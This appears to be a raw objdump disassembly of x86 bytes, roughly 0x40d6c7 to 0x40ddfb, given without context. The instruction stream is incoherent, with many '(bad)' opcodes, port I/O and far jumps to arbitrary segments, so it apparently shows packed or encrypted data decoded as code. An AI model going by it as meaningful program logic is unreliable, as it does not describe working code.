  40d6c7:	scas   eax,DWORD PTR es:[edi]
  40d6c8:	adc    edx,esi
  40d6ca:	push   eax
  40d6cb:	scas   eax,DWORD PTR es:[edi]
  40d6cc:	add    al,BYTE PTR [ecx]
  40d6ce:	inc    eax
  40d6cf:	mov    eax,ds:0x2b7b0c90
  40d6d4:	in     eax,0xe8
  40d6d6:	xchg   bl,ah
  40d6d8:	pop    esi
  40d6d9:	imul   edx,DWORD PTR [ebx],0xe9b2c027
  40d6df:	adc    BYTE PTR ds:0x14693661,ch
  40d6e5:	addr16 pushf 
  40d6e7:	mov    ch,0xaa
  40d6e9:	dec    eax
  40d6ea:	jecxz  0x40d6b1
  40d6ec:	pop    edi
  40d6ed:	or     eax,0x65e4bc4a
  40d6f2:	cs dec ecx
  40d6f4:	data16 aas 
  40d6f6:	cmp    esi,DWORD PTR [ebp+0x6a]
  40d6f9:	pusha  
  40d6fa:	std    
  40d6fb:	outs   dx,DWORD PTR ds:[esi]
  40d6fc:	pop    ds
  40d6fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6fe:	ficomp WORD PTR [eax+eax*8+0x7a]
  40d702:	out    dx,al
  40d703:	pop    edi
  40d704:	mov    al,0x6
  40d706:	push   cs
  40d707:	xor    eax,0xa254d142
  40d70c:	jmp    0x40d6ba
  40d70e:	pop    ebp
  40d70f:	push   ss
  40d710:	jg     0x40d71b
  40d712:	jge    0x40d785
  40d714:	test   BYTE PTR [esi+ebp*8+0x51],ah
  40d718:	lahf   
  40d719:	adc    eax,0x3cb01443
  40d71e:	xor    DWORD PTR [ecx-0x3ca10428],esp
  40d724:	dec    edi
  40d725:	test   BYTE PTR ds:0x6de93870,cl
  40d72b:	and    eax,esi
  40d72d:	mov    dl,0xe0
  40d72f:	sub    eax,0xa3f1adf3
  40d734:	cmp    dh,BYTE PTR [esi-0x69b1d0d1]
  40d73a:	pop    esi
  40d73b:	cmc    
  40d73c:	pop    ss
  40d73d:	cmc    
  40d73e:	add    DWORD PTR [eax],ecx
  40d740:	adc    DWORD PTR [eax],ebx
  40d742:	lods   eax,DWORD PTR ds:[esi]
  40d743:	aam    0x85
  40d745:	dec    ebp
  40d746:	rol    BYTE PTR [edx+0x6e],1
  40d749:	stos   DWORD PTR es:[edi],eax
  40d74a:	inc    esi
  40d74b:	in     al,dx
  40d74c:	add    BYTE PTR [ecx-0x7b],ah
  40d74f:	jae    0x40d77d
  40d751:	retf   
  40d752:	cli    
  40d753:	in     eax,dx
  40d754:	fnstenv [ebp-0x2edf3c11]
  40d75a:	dec    ebp
  40d75b:	and    DWORD PTR [ebx-0x63],esp
  40d75e:	mov    ch,bh
  40d760:	lea    eax,[eax-0x29]
  40d763:	ds push ds
  40d765:	adc    eax,DWORD PTR [ecx-0x188d832e]
  40d76b:	into   
  40d76c:	push   ss
  40d76d:	sub    BYTE PTR [edx],cl
  40d76f:	xor    al,0x5d
  40d771:	adc    ah,BYTE PTR [eax]
  40d773:	aad    0x9e
  40d775:	jbe    0x40d796
  40d777:	mov    eax,ds:0x88d281fd
  40d77c:	out    dx,al
  40d77d:	outs   dx,DWORD PTR ds:[esi]
  40d77e:	sub    dh,ch
  40d780:	pop    ebx
  40d781:	js     0x40d779
  40d783:	or     eax,0x7897d72f
  40d788:	sahf   
  40d789:	pushf  
  40d78a:	jmp    0x42a099a
  40d78f:	imul   esp,edx,0xa411a960
  40d795:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d796:	jo     0x40d7e2
  40d798:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40d79a:	and    DWORD PTR [eax-0x36],edi
  40d79d:	pusha  
  40d79e:	add    al,0xff
  40d7a0:	cld    
  40d7a1:	icebp  
  40d7a2:	adc    dl,BYTE PTR [esp+ebx*1+0x66]
  40d7a6:	popf   
  40d7a7:	xchg   ecx,eax
  40d7a8:	fisubr WORD PTR [ecx]
  40d7aa:	aas    
  40d7ab:	(bad)  
  40d7ac:	out    0x7c,al
  40d7ae:	cdq    
  40d7af:	pusha  
  40d7b0:	pop    esi
  40d7b1:	add    dh,bl
  40d7b3:	pop    eax
  40d7b4:	pop    ebp
  40d7b5:	mov    dh,0x28
  40d7b7:	sbb    ebx,DWORD PTR [eax-0x4f0beea0]
  40d7bd:	mov    eax,0xba5670a7
  40d7c2:	out    dx,al
  40d7c3:	sub    al,0x70
  40d7c5:	or     DWORD PTR [edi-0x7b],edx
  40d7c8:	mov    DWORD PTR [ebx],esp
  40d7ca:	es test al,0x6d
  40d7cd:	fmul   QWORD PTR [ecx+0x1d]
  40d7d0:	sub    eax,0x8b38ef61
  40d7d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d6:	out    dx,al
  40d7d7:	sub    eax,0xb52dec27
  40d7dc:	repz mov ah,0x6d
  40d7df:	mov    ds:0xdb3eda65,eax
  40d7e4:	pushf  
  40d7e5:	mov    ebp,0xbc7d344e
  40d7ea:	out    dx,al
  40d7eb:	jp     0x40d797
  40d7ed:	sub    dl,BYTE PTR [edi-0x10]
  40d7f0:	xchg   ebp,eax
  40d7f1:	inc    ebx
  40d7f2:	push   ds
  40d7f3:	jl     0x40d86f
  40d7f5:	push   ds
  40d7f6:	gs test al,0xf8
  40d7f9:	mov    ch,0xc4
  40d7fb:	int3   
  40d7fc:	in     al,0x10
  40d7fe:	test   BYTE PTR ds:0xd7eeda8b,ah
  40d804:	stos   DWORD PTR es:[edi],eax
  40d805:	repnz mov DWORD PTR [ebx+0x53],esi
  40d809:	ret    0x6982
  40d80c:	lods   al,BYTE PTR ds:[esi]
  40d80d:	pop    ebp
  40d80e:	jle    0x40d889
  40d810:	nop
  40d811:	or     bh,cl
  40d813:	dec    edx
  40d814:	(bad)  
  40d815:	ret    0xe0eb
  40d818:	pop    ebx
  40d819:	xlat   BYTE PTR ds:[ebx]
  40d81a:	cs push 0xffffff97
  40d81d:	jmp    0x40d7ad
  40d81f:	mov    ebx,0xa4631525
  40d824:	xchg   ecx,ecx
  40d826:	add    al,0xb6
  40d828:	lods   eax,DWORD PTR ds:[esi]
  40d829:	dec    esi
  40d82a:	jbe    0x40d7b5
  40d82c:	sub    al,0x2a
  40d82e:	out    dx,al
  40d82f:	push   esp
  40d830:	inc    eax
  40d831:	xchg   DWORD PTR [ecx+0x5b],esi
  40d834:	call   0x2ee90949
  40d839:	fs dec edx
  40d83b:	cld    
  40d83c:	adc    DWORD PTR [ecx],esp
  40d83e:	push   ebx
  40d83f:	stos   BYTE PTR es:[edi],al
  40d840:	lods   eax,DWORD PTR ds:[esi]
  40d841:	xchg   ecx,eax
  40d842:	out    dx,al
  40d843:	xchg   edi,esp
  40d845:	add    DWORD PTR [edx-0x34f32cb1],ebx
  40d84b:	lahf   
  40d84c:	and    esp,DWORD PTR [ebp+0x503ef249]
  40d852:	dec    edx
  40d853:	fst    st(6)
  40d855:	call   0x9bfc:0x197e3fe7
  40d85c:	iret   
  40d85d:	push   cs
  40d85e:	rol    DWORD PTR [eax+0x8a8e193],1
  40d864:	or     ah,BYTE PTR [ebp-0x49965ecd]
  40d86a:	cmp    DWORD PTR [eax],ecx
  40d86c:	pop    DWORD PTR [eax+ebp*8-0x113b952f]
  40d873:	mov    eax,eax
  40d875:	push   0xffffffc5
  40d877:	xlat   BYTE PTR ds:[ebx]
  40d878:	push   0xffffffdf
  40d87a:	pop    eax
  40d87b:	mov    eax,ds:0x37e57727
  40d880:	call   0x6fd3:0x5fb111b2
  40d887:	shl    DWORD PTR [esi+eax*1-0x6debb6d5],0x16
  40d88f:	mov    eax,ds:0x4cb91c45
  40d894:	dec    ecx
  40d895:	or     al,BYTE PTR [edi+0x6]
  40d898:	pop    edi
  40d899:	in     eax,0x11
  40d89b:	mov    BYTE PTR [edi-0x10],0xf3
  40d89f:	push   eax
  40d8a0:	dec    edi
  40d8a1:	sti    
  40d8a2:	int    0xa0
  40d8a4:	jae    0x40d8c1
  40d8a6:	xor    cx,cx
  40d8a9:	pop    ebx
  40d8aa:	mov    ds:0x635e5e1d,al
  40d8af:	xor    eax,0xefe466c8
  40d8b4:	jmp    0xabda:0x5e0f7a04
  40d8bb:	popf   
  40d8bc:	or     al,0xd2
  40d8be:	cli    
  40d8bf:	mov    eax,ds:0x8a7ddb5f
  40d8c4:	jbe    0x40d943
  40d8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8c7:	sbb    esp,edi
  40d8c9:	sahf   
  40d8ca:	lea    ecx,[ecx]
  40d8cc:	cli    
  40d8cd:	pusha  
  40d8ce:	jecxz  0x40d8ea
  40d8d0:	or     eax,0x6cdf6931
  40d8d5:	test   al,0xb2
  40d8d7:	push   esi
  40d8d8:	frstor [eax-0x2c]
  40d8db:	not    DWORD PTR [edi]
  40d8dd:	mov    ebx,0x5a47f6a2
  40d8e2:	scas   al,BYTE PTR es:[edi]
  40d8e3:	bound  ebp,QWORD PTR [ebx+0x6d]
  40d8e6:	shl    BYTE PTR [eax+0x26],0xf7
  40d8ea:	fistp  WORD PTR [esi+0x1d]
  40d8ee:	jbe    0x40d8c6
  40d8f0:	into   
  40d8f1:	adc    DWORD PTR [edx+0xf],edx
  40d8f4:	int3   
  40d8f5:	pop    edi
  40d8f6:	int3   
  40d8f7:	xor    eax,0xdc390ee7
  40d8fc:	lea    edi,[eax-0x1da12af7]
  40d902:	mov    dl,al
  40d904:	mov    dl,0x49
  40d906:	cs jnp 0x40d8a2
  40d909:	inc    esp
  40d90a:	sub    eax,0x82714e81
  40d90f:	test   BYTE PTR [edi],0x17
  40d912:	out    dx,al
  40d913:	fcmovne st,st(4)
  40d915:	enter  0xd05b,0x19
  40d919:	push   ebx
  40d91a:	adc    esp,DWORD PTR [ecx-0x33a1e84d]
  40d920:	add    eax,0x325f503e
  40d925:	(bad)  
  40d926:	jg     0x40d8c9
  40d928:	in     eax,dx
  40d929:	rcl    BYTE PTR [edi-0x4cda4d96],cl
  40d92f:	mov    al,ds:0x7491c5e9
  40d934:	mov    esp,0x5e7de2da
  40d939:	leave  
  40d93a:	pop    es
  40d93b:	mov    bh,0x98
  40d93d:	xor    al,BYTE PTR [ebp-0x54]
  40d940:	aas    
  40d941:	popa   
  40d942:	cmp    bl,BYTE PTR [edx+0x62]
  40d945:	sbb    DWORD PTR [ebx+0x51],edi
  40d948:	nop    esi
  40d94b:	test   BYTE PTR [ecx-0x40c68072],bl
  40d951:	stos   DWORD PTR es:[edi],eax
  40d952:	mov    dl,0xa3
  40d954:	div    DWORD PTR [esi]
  40d956:	push   esp
  40d957:	jle    0x40d93e
  40d959:	pop    ecx
  40d95a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d95b:	fisttp WORD PTR [edi-0x14]
  40d95e:	jmp    0x40d8e7
  40d960:	hlt    
  40d961:	retf   
  40d962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d963:	mov    esp,0xa37df0b0
  40d968:	and    eax,0xbf25b861
  40d96d:	cwde   
  40d96e:	test   al,0x4
  40d970:	or     ah,BYTE PTR [ebx+0x21]
  40d973:	rcr    DWORD PTR [edx+0x44db9edd],cl
  40d979:	ss push ecx
  40d97b:	xor    DWORD PTR [esi-0x345e231b],ecx
  40d981:	ret    0x8fc9
  40d984:	pop    esp
  40d985:	push   esi
  40d986:	je     0x40d9ed
  40d988:	jno    0x40d97b
  40d98a:	out    dx,al
  40d98b:	dec    edi
  40d98c:	inc    edx
  40d98d:	pop    es
  40d98e:	jmp    0x47a1:0x487b35e7
  40d995:	mov    al,ds:0x921312c3
  40d99a:	pop    ds
  40d99b:	cmp    ebx,DWORD PTR [esi-0x53]
  40d99e:	or     al,0x83
  40d9a0:	mov    ah,0x19
  40d9a2:	aam    0xee
  40d9a4:	out    dx,al
  40d9a5:	push   ecx
  40d9a6:	jle    0x40da24
  40d9a8:	popf   
  40d9a9:	stos   DWORD PTR es:[edi],eax
  40d9aa:	int    0x40
  40d9ac:	test   al,0xe3
  40d9ae:	ins    BYTE PTR es:[edi],dx
  40d9af:	rol    DWORD PTR [eax],0x7d
  40d9b2:	out    dx,al
  40d9b3:	nop
  40d9b4:	sti    
  40d9b5:	test   BYTE PTR [edx-0x7c],dl
  40d9b8:	push   edi
  40d9b9:	out    0x36,eax
  40d9bb:	jns    0x40d961
  40d9bd:	pusha  
  40d9be:	jne    0x40d99d
  40d9c0:	jmp    0xf06e:0xa78cf96d
  40d9c7:	dec    DWORD PTR [edx+esi*8]
  40d9ca:	retf   0x9e40
  40d9cd:	dec    edi
  40d9ce:	sub    ch,ah
  40d9d0:	jle    0x40da31
  40d9d2:	add    esi,DWORD PTR [esi]
  40d9d4:	retf   
  40d9d5:	jle    0x40da53
  40d9d7:	icebp  
  40d9d8:	adc    bl,BYTE PTR [esi]
  40d9da:	outs   dx,DWORD PTR ds:[esi]
  40d9db:	mov    al,0x96
  40d9dd:	push   esi
  40d9df:	or     esi,edx
  40d9e1:	push   edx
  40d9e2:	out    dx,al
  40d9e3:	popa   
  40d9e4:	into   
  40d9e5:	sub    al,0x26
  40d9e7:	jecxz  0x40d97b
  40d9e9:	neg    DWORD PTR [eax]
  40d9eb:	and    eax,0x60
  40d9ee:	mov    gs,WORD PTR [ebx]
  40d9f0:	enter  0xa757,0x3
  40d9f4:	fist   DWORD PTR [eax]
  40d9f6:	pusha  
  40d9f7:	sub    DWORD PTR [esi+0x63],ebx
  40d9fa:	(bad)  
  40d9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9fc:	call   0x1663:0xbcaad8c3
  40da03:	or     al,0x53
  40da05:	jo     0x40d9ab
  40da07:	popa   
  40da08:	pop    ecx
  40da09:	imul   edi,DWORD PTR [esi-0x113aee40],0xffffffdc
  40da10:	mov    ebp,0xac26c30b
  40da15:	cvtps2pi mm2,QWORD PTR [edi+0x68b05100]
  40da1c:	mov    ah,BYTE PTR [eax-0x3]
  40da1f:	sbb    DWORD PTR [eax],ebp
  40da21:	pop    edi
  40da22:	inc    edx
  40da23:	sub    bl,BYTE PTR [edi+0x45]
  40da26:	in     eax,dx
  40da27:	hlt    
  40da28:	pop    ebx
  40da29:	mov    eax,ds:0x74f6ab7c
  40da2e:	and    bh,cl
  40da30:	pop    esi
  40da31:	adc    ebp,DWORD PTR [ebp-0x79af9a04]
  40da37:	add    eax,0xa14b2c4f
  40da3c:	mov    cl,ch
  40da3e:	jl     0x40da85
  40da40:	call   0xdf8e:0x5b4b23a7
  40da47:	mov    esp,0xd83edae0
  40da4c:	es jmp 0xb5b8:0x611608b0
  40da54:	neg    DWORD PTR [esi+0x435f71bc]
  40da5a:	out    dx,al
  40da5b:	stos   BYTE PTR es:[edi],al
  40da5c:	shr    BYTE PTR [ecx-0x1e],1
  40da5f:	sbb    ebp,DWORD PTR [ecx+0x1]
  40da62:	mov    bl,0xa3
  40da64:	lds    ebx,FWORD PTR es:[esp+ebx*2-0x37]
  40da69:	retf   0x827e
  40da6c:	stos   DWORD PTR es:[edi],eax
  40da6d:	pop    ecx
  40da6e:	repz pop esp
  40da70:	xor    cl,dh
  40da72:	ret    
  40da73:	and    bl,dl
  40da75:	nop
  40da76:	hlt    
  40da77:	add    BYTE PTR [ebp+0x52],dl
  40da7a:	mov    al,ds:0x50f44500
  40da7f:	mov    BYTE PTR [eax],0x50
  40da82:	loopne 0x40dad9
  40da84:	push   ds
  40da85:	push   ss
  40da86:	fild   DWORD PTR [ebx+0x63]
  40da89:	sub    eax,0x20e2ee03
  40da8e:	fcomp  QWORD PTR [esi-0x4fc870e6]
  40da94:	lods   eax,DWORD PTR ds:[esi]
  40da95:	pop    edi
  40da96:	out    dx,al
  40da97:	ins    BYTE PTR es:[edi],dx
  40da98:	popf   
  40da99:	xlat   BYTE PTR ds:[ebx]
  40da9a:	jle    0x40da2f
  40da9c:	xchg   ebx,eax
  40da9d:	pushf  
  40da9e:	in     eax,dx
  40da9f:	mov    esp,0x6ab81075
  40daa4:	retf   
  40daa5:	mov    bl,0xce
  40daa7:	addr16 icebp 
  40daa9:	pusha  
  40daaa:	fisttp WORD PTR [esi-0x778b0401]
  40dab0:	rcl    BYTE PTR cs:[esp+edi*8+0x5e],cl
  40dab5:	inc    ecx
  40dab6:	jmp    DWORD PTR [ecx+0x2825a6a8]
  40dabc:	repz pop ebp
  40dabe:	jge    0x40da85
  40dac0:	sub    edi,DWORD PTR [ebx]
  40dac2:	inc    ecx
  40dac3:	jne    0x40da7b
  40dac5:	mov    ecx,0xc23c5890
  40daca:	je     0x40da64
  40dacc:	arpl   WORD PTR [eax-0x4c019e5a],di
  40dad2:	stos   DWORD PTR es:[edi],eax
  40dad3:	push   ds
  40dad4:	in     eax,0x5f
  40dad6:	cli    
  40dad7:	sub    eax,0xb55393d4
  40dadc:	arpl   WORD PTR [ebp-0x60ab72e7],ax
  40dae2:	push   eax
  40dae3:	call   0x2d08:0xd2e4001e
  40daea:	pop    ss
  40daeb:	mov    eax,ds:0x2f3f08be
  40daf0:	addr16 mov al,ds:0x9f63
  40daf4:	pop    esi
  40daf5:	lods   eax,DWORD PTR ds:[esi]
  40daf6:	or     al,BYTE PTR ds:0xe46fa9a6
  40dafc:	pushf  
  40dafd:	push   ecx
  40dafe:	pop    edi
  40daff:	xor    al,0xb0
  40db01:	or     cl,BYTE PTR [esi+0x52c26c00]
  40db07:	mov    DWORD PTR [esi+0x60],ebx
  40db0a:	sbb    al,0x58
  40db0c:	aas    
  40db0d:	mov    ebp,0x612ff874
  40db12:	leave  
  40db13:	xchg   ecx,eax
  40db14:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40db16:	add    bl,BYTE PTR [edi+0x3e]
  40db19:	call   0x3af8:0x489aeee
  40db20:	jle    0x40daf6
  40db22:	imul   esp,DWORD PTR [edx+0x2f50b79a],0xffffffcb
  40db29:	xchg   esp,eax
  40db2a:	adc    cl,al
  40db2c:	out    dx,al
  40db2d:	mov    dh,0xee
  40db2f:	mov    bl,0x5b
  40db31:	mov    edi,gs
  40db33:	(bad)  
  40db34:	mov    bl,0xf4
  40db36:	jle    0x40dada
  40db38:	inc    ebp
  40db39:	add    eax,DWORD PTR [edx-0x6]
  40db3c:	ds (bad) 
  40db3e:	sub    DWORD PTR [ecx],eax
  40db40:	and    esi,ebx
  40db42:	cmc    
  40db43:	inc    esp
  40db44:	jmp    0x40db9e
  40db46:	pop    ebp
  40db47:	lahf   
  40db48:	repz pusha 
  40db4a:	push   edx
  40db4b:	inc    ecx
  40db4c:	mov    al,0xc2
  40db4e:	int    0xa0
  40db50:	sti    
  40db51:	jmp    0x40db77
  40db53:	inc    esp
  40db54:	mov    edx,0x5edd0825
  40db59:	call   0xb870:0xffcf0ffb
  40db60:	addr16 jno 0x40db7d
  40db63:	mov    al,0xba
  40db65:	mov    cl,0xf4
  40db67:	mov    esp,0x89daa459
  40db6c:	adc    ecx,ebx
  40db6e:	cs leave 
  40db70:	daa    
  40db71:	out    0xb7,eax
  40db73:	lahf   
  40db74:	jns    0x40db78
  40db76:	inc    esp
  40db77:	or     DWORD PTR [esi],ebx
  40db79:	inc    ebx
  40db7a:	mov    ah,0x17
  40db7c:	popf   
  40db7d:	xor    ebx,DWORD PTR [edi]
  40db7f:	enter  0xe109,0x7a
  40db83:	adc    DWORD PTR [edx-0x53dba660],edi
  40db89:	pusha  
  40db8a:	cmp    al,0xf0
  40db8c:	xchg   ecx,eax
  40db8d:	loop   0x40dbcd
  40db8f:	xor    ch,BYTE PTR ds:0xd8cdee7e
  40db95:	xor    bl,bl
  40db97:	sbb    al,0xd5
  40db99:	mov    ebx,0x608c7159
  40db9e:	inc    ebx
  40db9f:	pop    edx
  40dba0:	hlt    
  40dba1:	add    DWORD PTR [ebp-0x10868144],esi
  40dba7:	sbb    cl,ah
  40dba9:	mov    ds:0x3f2c20e6,eax
  40dbae:	push   ss
  40dbaf:	dec    edi
  40dbb0:	mov    bl,0x60
  40dbb2:	mov    eax,0x65abc57a
  40dbb7:	sub    ebp,DWORD PTR [edi]
  40dbb9:	hlt    
  40dbba:	out    dx,al
  40dbbb:	icebp  
  40dbbc:	in     eax,0x1e
  40dbbe:	cld    
  40dbbf:	(bad)  
  40dbc0:	cs push esp
  40dbc2:	and    bh,BYTE PTR [edx+0x7a]
  40dbc5:	data16 shl BYTE PTR [eax-0xe62bd49],cl
  40dbcc:	mov    dh,0xec
  40dbce:	fsubr  QWORD PTR [eax+0x72]
  40dbd1:	neg    esi
  40dbd3:	neg    DWORD PTR [esi-0x2f]
  40dbd6:	hlt    
  40dbd7:	fmulp  st(4),st
  40dbd9:	push   edx
  40dbda:	xchg   ecx,eax
  40dbdb:	pop    eax
  40dbdc:	mov    bl,BYTE PTR [esi-0xe]
  40dbdf:	xchg   ebp,eax
  40dbe0:	enter  0x4334,0x0
  40dbe4:	std    
  40dbe5:	rcr    esp,cl
  40dbe7:	push   eax
  40dbe8:	dec    eax
  40dbe9:	inc    edx
  40dbea:	out    dx,eax
  40dbeb:	and    DWORD PTR [ebx],0xfffffff1
  40dbee:	and    WORD PTR [esi-0x41],0xc8a1
  40dbf4:	dec    ebx
  40dbf5:	and    dh,dl
  40dbf7:	mov    al,ds:0x13b3b3c9
  40dbfc:	jno    0x40dc14
  40dbfe:	dec    ebp
  40dbff:	clc    
  40dc00:	pop    esi
  40dc01:	push   eax
  40dc02:	jno    0x40dbc1
  40dc04:	push   ecx
  40dc05:	sbb    DWORD PTR [eax*4-0x1c729eff],ebp
  40dc0c:	pop    ebx
  40dc0d:	push   0x5a
  40dc0f:	mov    ch,0xf8
  40dc11:	and    esp,edi
  40dc13:	adc    edx,ebp
  40dc15:	std    
  40dc16:	and    edi,eax
  40dc18:	jle    0x40dc1b
  40dc1a:	mov    al,0xc4
  40dc1c:	mov    dl,0x60
  40dc1e:	sbb    esp,DWORD PTR [eax-0x58]
  40dc21:	outs   dx,DWORD PTR ds:[esi]
  40dc22:	push   eax
  40dc23:	out    0x42,al
  40dc25:	(bad)  
  40dc26:	out    dx,al
  40dc27:	cli    
  40dc28:	les    ebx,FWORD PTR [edx]
  40dc2a:	mov    ds:0x3dbb80ee,eax
  40dc2f:	out    dx,eax
  40dc30:	fwait
  40dc31:	jb     0x40dc94
  40dc33:	fsubr  QWORD PTR [esi]
  40dc35:	popa   
  40dc36:	sub    eax,0x420e5244
  40dc3b:	adc    DWORD PTR [esi+0xb],ebx
  40dc3e:	cld    
  40dc3f:	dec    edx
  40dc40:	fimul  DWORD PTR [ebx]
  40dc42:	(bad)  
  40dc44:	xchg   ecx,eax
  40dc45:	pusha  
  40dc46:	inc    esp
  40dc48:	arpl   WORD PTR [ecx+0x1740c2],ax
  40dc4e:	out    dx,eax
  40dc4f:	vdivsd xmm4,xmm2,QWORD PTR [eax+ecx*4]
  40dc54:	add    edx,ecx
  40dc56:	mov    DWORD PTR [ecx+0x47f98b6],esp
  40dc5c:	jge    0x40dc1b
  40dc5e:	addr16 pop eax
  40dc60:	pop    ebx
  40dc61:	dec    edi
  40dc62:	sbb    cl,BYTE PTR [esi+0x8]
  40dc65:	mov    WORD PTR [edx],ds
  40dc67:	sahf   
  40dc68:	sahf   
  40dc69:	and    DWORD PTR [eax],eax
  40dc6b:	mov    ah,0xce
  40dc6d:	pusha  
  40dc6e:	sub    bh,BYTE PTR [edi-0x66f649ad]
  40dc74:	push   edx
  40dc75:	and    DWORD PTR [ebx],esp
  40dc77:	popf   
  40dc78:	add    esp,DWORD PTR [ecx-0x2f]
  40dc7b:	lock jno 0x40dc08
  40dc7e:	jp     0x40dc33
  40dc80:	push   ebp
  40dc81:	popa   
  40dc82:	in     eax,dx
  40dc83:	or     eax,0x6fccda3a
  40dc88:	loop   0x40dc81
  40dc8a:	jmp    0x40dceb
  40dc8c:	or     BYTE PTR [ebx-0xf6f9616],al
  40dc92:	sub    eax,0x6d611cdb
  40dc97:	in     al,0xfa
  40dc99:	inc    ebp
  40dc9a:	daa    
  40dc9b:	or     BYTE PTR [ebp-0x37],ch
  40dc9e:	out    dx,al
  40dc9f:	jns    0x40dcb1
  40dca1:	pop    edi
  40dca2:	sbb    al,0x1a
  40dca4:	adc    DWORD PTR [eax+0x67],0xffffffa1
  40dca8:	loop   0x40dc31
  40dcaa:	(bad)  
  40dcab:	call   0xe66bc7e8
  40dcb0:	test   BYTE PTR [eax+0x6b8ca7ee],dl
  40dcb6:	outs   dx,DWORD PTR ds:[esi]
  40dcb7:	loopne 0x40dd1a
  40dcb9:	xor    al,ah
  40dcbb:	mov    al,ds:0x6b8dc010
  40dcc0:	or     eax,0x5e034aec
  40dcc5:	pop    ss
  40dcc6:	mov    ebx,0x811baa8
  40dccb:	and    esi,DWORD PTR [eax-0x3b51f3d1]
  40dcd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd2:	outs   dx,BYTE PTR ds:[esi]
  40dcd3:	push   cs
  40dcd4:	imul   esp,DWORD PTR [eax+0x437e13fa],0xffffffce
  40dcdb:	popf   
  40dcdc:	sub    bl,BYTE PTR [ecx+0x7f]
  40dcdf:	xchg   esp,ebp
  40dce1:	pusha  
  40dce2:	mov    bh,0x18
  40dce4:	and    al,0x4
  40dce6:	xor    ebp,DWORD PTR [ebx]
  40dce8:	dec    ebp
  40dce9:	into   
  40dcea:	out    dx,al
  40dceb:	mov    edi,0xf0060484
  40dcf0:	mov    cl,BYTE PTR [ebp-0x91560b6]
  40dcf6:	aad    0xcb
  40dcf8:	mov    edi,0xd6cb7698
  40dcfd:	push   esp
  40dcfe:	push   esi
  40dcff:	shl    cl,1
  40dd01:	test   eax,0x72971eed
  40dd06:	(bad)  
  40dd07:	mov    ecx,0x6066410f
  40dd0c:	inc    eax
  40dd0d:	pop    esp
  40dd0e:	(bad)  
  40dd0f:	fcomp  QWORD PTR [ebp+0x11]
  40dd12:	inc    ecx
  40dd13:	popa   
  40dd14:	sti    
  40dd15:	call   0xe59f845e
  40dd1a:	(bad)
  40dd1d:	mov    ch,0xc3
  40dd1f:	push   ecx
  40dd20:	inc    ecx
  40dd21:	popa   
  40dd22:	sahf   
  40dd23:	out    0x57,eax
  40dd25:	fdivr  DWORD PTR [edx-0x112bbdb4]
  40dd2b:	inc    edi
  40dd2c:	outs   dx,BYTE PTR ds:[esi]
  40dd2d:	inc    ebx
  40dd2e:	stos   DWORD PTR es:[edi],eax
  40dd2f:	call   0xa1212983
  40dd34:	mov    dh,0xe0
  40dd36:	dec    ebp
  40dd37:	shr    DWORD PTR [eax+0x7f],1
  40dd3a:	ins    DWORD PTR es:[edi],dx
  40dd3b:	push   esi
  40dd3c:	pop    esi
  40dd3d:	cmp    BYTE PTR [esi+0x2b20ff5c],bl
  40dd43:	lods   eax,DWORD PTR ds:[esi]
  40dd44:	(bad)  
  40dd45:	pusha  
  40dd46:	clc    
  40dd47:	jg     0x40dd9b
  40dd49:	xchg   edx,eax
  40dd4a:	push   0xf3e956b2
  40dd4f:	pop    ecx
  40dd50:	pop    ds
  40dd51:	mov    es,edx
  40dd53:	and    BYTE PTR [eax],dl
  40dd55:	lods   al,BYTE PTR ds:[esi]
  40dd56:	call   0x1ed3:0x86610937
  40dd5d:	cmp    al,0x4e
  40dd5f:	outs   dx,DWORD PTR ds:[esi]
  40dd60:	scas   al,BYTE PTR es:[edi]
  40dd61:	dec    ecx
  40dd62:	out    dx,al
  40dd63:	cli    
  40dd64:	fadd   QWORD PTR [edx]
  40dd66:	imul   ebp,esi,0xa10440b1
  40dd6c:	out    0xd8,eax
  40dd6e:	(bad)  
  40dd6f:	pop    eax
  40dd70:	xor    dh,BYTE PTR [edi-0x5f0c2e14]
  40dd76:	out    dx,al
  40dd77:	xchg   edi,eax
  40dd78:	mov    eax,ds:0xe437566a
  40dd7d:	stos   DWORD PTR es:[edi],eax
  40dd7e:	addr16 mov eax,ds:0x7bd5
  40dd82:	scas   al,BYTE PTR es:[edi]
  40dd83:	xlat   BYTE PTR ds:[ebx]
  40dd84:	and    al,0xcf
  40dd86:	add    eax,0x1293596
  40dd8b:	or     eax,0x212088dd
  40dd90:	sub    al,BYTE PTR [eax-0x2c239989]
  40dd96:	adc    eax,0x598095a1
  40dd9b:	call   0x4d7a:0x36e25a5c
  40dda2:	out    dx,al
  40dda3:	mov    al,0xea
  40dda5:	inc    ebx
  40dda6:	push   ecx
  40dda7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dda8:	mov    ds:0x60a0f129,al
  40ddad:	pop    ecx
  40ddae:	mov    dl,0xb7
  40ddb0:	clc    
  40ddb1:	inc    eax
  40ddb2:	sub    DWORD PTR [edx],0x64
  40ddb5:	xchg   DWORD PTR [ebp+0x3ea0d8df],ecx
  40ddbb:	pop    esi
  40ddbc:	dec    esp
  40ddbd:	out    dx,eax
  40ddbe:	and    cl,BYTE PTR [ebp-0x5f23ba0d]
  40ddc4:	xchg   ebx,eax
  40ddc6:	push   ds
  40ddc7:	mov    ch,0x4f
  40ddc9:	out    0xf3,eax
  40ddcb:	pop    edx
  40ddcc:	mov    bl,0x78
  40ddce:	mov    esi,0x43300920
  40ddd3:	(bad)  
  40ddd4:	xor    DWORD PTR [ecx+0x20],esp
  40ddd7:	je     0x40de39
  40ddd9:	enter  0x4770,0x7f
  40dddd:	jge    0x40ddcd
  40dddf:	mov    eax,ds:0x9a1f71fd
  40dde4:	in     eax,dx
  40dde5:	jg     0x40de45
  40dde7:	mov    ds:0x82ad206,al
  40ddec:	ret    
  40dded:	fstp   DWORD PTR [ebp-0x11c1f6b3]
  40ddf3:	hlt    
  40ddf4:	jge    0x40de41
  40ddf6:	mov    ebp,0x6b3cbc3c
  40ddfb:	mov    eax,ds:0x94f46ace
